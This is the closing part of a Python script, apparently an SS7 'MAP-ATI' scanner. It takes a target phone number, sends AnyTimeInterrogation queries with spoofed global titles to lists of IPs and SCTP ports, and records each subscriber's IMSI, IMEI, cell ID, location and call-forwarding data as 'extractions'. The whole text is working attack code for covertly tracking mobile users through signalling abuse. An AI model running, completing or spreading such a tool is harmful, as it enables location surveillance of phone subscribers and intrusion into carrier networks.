            args.sccp_proto_class_pool = [int(x.strip()) for x in args.sccp_proto_class_pool.split(',') if x.strip()]
        except ValueError:
            args.sccp_proto_class_pool = SCCP_PROFESSIONAL['sccp_proto_class_pool']
    else:
        args.sccp_proto_class_pool = SCCP_PROFESSIONAL['sccp_proto_class_pool']
    
    # Parse professional ports
    if args.sctp_ports:
        ports = set()
        try:
            for part in args.sctp_ports.split(','):
                part = part.strip()
                if '-' in part:
                    start, end = map(int, part.split('-', 1))
                    ports.update(range(start, end + 1))
                else:
                    ports.add(int(part))
        except ValueError:
            ports = set(PROFESSIONAL_CONFIG['sctp_ports'])
        target_ports = sorted(list(ports))
    else:
        target_ports = PROFESSIONAL_CONFIG['sctp_ports']
    
    # Load professional IPs
    ip_file = Path(args.ips_file)
    if not ip_file.exists():
        print_colored(f"❌ Professional IPs file not found: {ip_file}", Colors.RED, bold=True)
        sys.exit(1)
    
    try:
        with open(ip_file, 'r', encoding='utf-8') as f:
            ips = [line.strip().split('#')[0].strip() for line in f 
                  if line.strip() and not line.strip().startswith('#')]
    except Exception as e:
        print_colored(f"❌ Professional error reading IPs file: {e}", Colors.RED, bold=True)
        sys.exit(1)
    
    if not ips:
        print_colored("❌ No valid IPs found in professional file", Colors.RED, bold=True)
        sys.exit(1)
    
    # Initialize professional GT Pool
    gt_pool = ProfessionalGTPool(args.cgpa_gt_digits, args.gt_pool_size)
    
    # Display professional configuration
    print_colored(f"\n📞 Professional Target MSISDN: {args.target_msisdn}", Colors.YELLOW, bold=True)
    print_colored(f"🧵 Professional Threads: {args.threads}", Colors.CYAN)
    print_colored(f"🔄 Professional ATI Variant: {args.ati_variant.value}", Colors.MAGENTA)
    print_colored(f"🌐 Professional Scope: {len(ips)} IPs, {len(target_ports)} ports", Colors.BLUE)
    print_colored(f"📊 Professional Total targets: {len(ips) * len(target_ports)}", Colors.BRIGHT_BLUE, bold=True)
    print_colored(f"⏰ Professional SCTP Timeout: {args.sctp_timeout}s", Colors.YELLOW)
    print_colored(f"📂 Professional Results Directory: {results_dir}", Colors.GREEN)
    
    # Initialize professional stats
    PROFESSIONAL_STATS['start_time'] = time.time()
    
    # Create professional tasks
    tasks = []
    for ip in ips:
        for port in target_ports:
            tasks.append({
                'ip': ip,
                'port': port,
                'otid': os.urandom(4),
                'variant': args.ati_variant,
                'attempt': 1
            })
    
    logger.info(f"Professional scan starting: {len(ips)} IPs, {len(target_ports)} ports, {len(tasks)} total tasks")
    
    # Professional CSV setup
    csv_headers = [
        "ip", "port", "timestamp", "sent_otid", "used_cgpa_gt", "used_cgpa_ssn",
        "used_sccp_pc", "ati_variant_used", "attempt_number", "tcap_outcome",
        "success", "map_version", "application_context", "mcc", "mnc", "lac", "cell_id", 
        "cgi_found", "lai_found", "imsi", "msisdn", "imei", "vlr_name", "msc_name", 
        "sgsn_name", "gmlc_name", "subscriber_state", "equipment_status", 
        "geographical_info", "location_number", "location_age", "rac", "service_area_code",
        "camel_subscription_info", "call_forwarding_data", "call_barring_info",
        "odb_info", "roaming_restriction", "duration_ms", "error_info", "error_code",
        "received_dtid", "raw_response_hex", "parsed_data_size"
    ]
    
    professional_csv = None
    if not args.no_csv:
        professional_csv = results_dir / "professional_scan_results_v4.csv"
        with open(professional_csv, 'w', newline='', encoding='utf-8') as f:
            f.write(",".join(csv_headers) + "\n")
        print_colored(f"📝 Professional CSV Results: {professional_csv}", Colors.GREEN)
    
    print_colored("\n🚀 Starting Professional Scan...\n", Colors.BRIGHT_GREEN, bold=True)
    
    # Execute professional scan
    all_results = []
    processed_count = 0
    
    try:
        with ThreadPoolExecutor(max_workers=args.threads, thread_name_prefix="ProfessionalScanner") as executor:
            # Submit all professional tasks
            future_to_task = {}
            for task_def in tasks:
                future = executor.submit(
                    process_target_professional,
                    task_def['ip'],
                    task_def['port'],
                    args,
                    task_def['otid'],
                    task_def['variant'],
                    task_def['attempt']
                )
                future_to_task[future] = task_def
            
            # Process completed professional tasks
            for future in as_completed(future_to_task):
                processed_count += 1
                task_def = future_to_task[future]
                
                try:
                    result = future.result()
                    if result:
                        all_results.append(result)
                        
                        # Save to professional CSV
                        if professional_csv:
                            save_professional_result_to_csv(result, professional_csv, csv_headers)
                        
                        # Professional progress indicator
                        if processed_count % 25 == 0:
                            progress = (processed_count / len(tasks)) * 100
                            print_colored(f"🔄 Professional Progress: {processed_count}/{len(tasks)} ({progress:.1f}%)", 
                                        Colors.CYAN)
                        
                except Exception as exc:
                    logger.error(f"Professional task exception for {task_def['ip']}:{task_def['port']}: {exc}")
        
        # Display professional final statistics
        display_professional_final_statistics()
        
        # Professional summary of significant findings
        full_info_results = [r for r in all_results if r.location_info.cgi_found and r.subscriber_info.imsi != "N/A"]
        cgi_results = [r for r in all_results if r.location_info.cgi_found]
        imsi_results = [r for r in all_results if r.subscriber_info.imsi != "N/A"]
        
        if full_info_results:
            print_colored(f"\n🎯 FULL INFORMATION EXTRACTIONS ({len(full_info_results)}):", Colors.BRIGHT_GREEN, bold=True)
            for result in full_info_results[:5]:
                print_colored(f"   {result.ip}:{result.port} - CGI: {result.location_info.mcc}-{result.location_info.mnc}-{result.location_info.lac}-{result.location_info.cell_id}, IMSI: {result.subscriber_info.imsi}", Colors.BRIGHT_GREEN)
            if len(full_info_results) > 5:
                print_colored(f"   ... and {len(full_info_results) - 5} more complete extractions", Colors.BRIGHT_GREEN)
        
        if cgi_results:
            print_colored(f"\n📍 LOCATION EXTRACTIONS ({len(cgi_results)}):", Colors.GREEN, bold=True)
            for result in cgi_results[:8]:
                print_colored(f"   {result.ip}:{result.port} - MCC:{result.location_info.mcc}, MNC:{result.location_info.mnc}, LAC:{result.location_info.lac}, CI:{result.location_info.cell_id}", Colors.GREEN)
            if len(cgi_results) > 8:
                print_colored(f"   ... and {len(cgi_results) - 8} more location extractions", Colors.GREEN)
        
        if imsi_results:
            print_colored(f"\n📱 SUBSCRIBER EXTRACTIONS ({len(imsi_results)}):", Colors.BRIGHT_CYAN, bold=True)
            for result in imsi_results[:6]:
                print_colored(f"   {result.ip}:{result.port} - IMSI: {result.subscriber_info.imsi}", Colors.CYAN)
            if len(imsi_results) > 6:
                print_colored(f"   ... and {len(imsi_results) - 6} more subscriber extractions", Colors.CYAN)
        
        print_colored(f"\n✅ Professional scan completed successfully!", Colors.BRIGHT_GREEN, bold=True)
        print_colored(f"📂 Professional results saved to: {results_dir.resolve()}", Colors.GREEN)
        
        logger.info("Professional MAP-ATI Scanner v4.0 completed successfully")
        
    except KeyboardInterrupt:
        print_colored("\n\n⚠️ Professional scan interrupted by user", Colors.YELLOW, bold=True)
        logger.info("Professional scan interrupted by user")
        display_professional_final_statistics()
    except Exception as e:
        print_colored(f"\n\n❌ Professional scan failed with error: {e}", Colors.RED, bold=True)
        logger.error(f"Professional scan failed: {e}", exc_info=True)
        display_professional_final_statistics()

if __name__ == "__main__":
    if sys.version_info < (3, 7):
        print_colored("❌ This professional script requires Python 3.7+.", Colors.RED, bold=True)
        sys.exit(1)
    
    try:
        main()
    except Exception as e:
        print_colored(f"❌ Professional fatal error: {e}", Colors.RED, bold=True)
        sys.exit(1)
